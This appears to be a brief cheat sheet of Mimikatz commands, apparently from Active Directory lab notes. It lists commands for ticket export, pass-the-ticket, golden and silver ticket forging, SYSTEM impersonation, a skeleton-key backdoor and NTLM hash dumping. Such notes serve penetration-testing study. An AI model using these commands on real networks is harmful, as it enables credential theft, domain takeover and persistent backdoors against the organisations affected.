# MIMIKATZ

## Author: https://github.com/gentilkiwi/mimikatz

### privilege::debug = Shows privileges on machine ( Ensure output is "20 OK")

### sekurlsa::tickets /export = Exports all .kirbi tickets to current directory

### kerberos::ptt TICKET = It will cache and impersonate the given ticket we harvested earlier (Pass-the-Ticket)

### klist = List our cached tickets

### token::elevate/revert = Impersonate SYSTEM

### lsadump::lsa /inject /name:krbtgt = Dumps the hash as well as the security identifier needed to create a golden ticket

### lsadump::lsa /inject /name:DOMAIN_ADMIN/SERVICE_ACCOUNT = Silver Ticket

### kerberos::golden /user:Administrator /domain:CONTROLLER.LOCAL /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:ID

### misc::cmd = Elevates command prompt with the given ticket

### misc::skeleton = Skeleton keyu (Kerberos Backdoor) (Default credentials: mimikatz)

### lsadump::lsa /patch = NTLM hashes dump
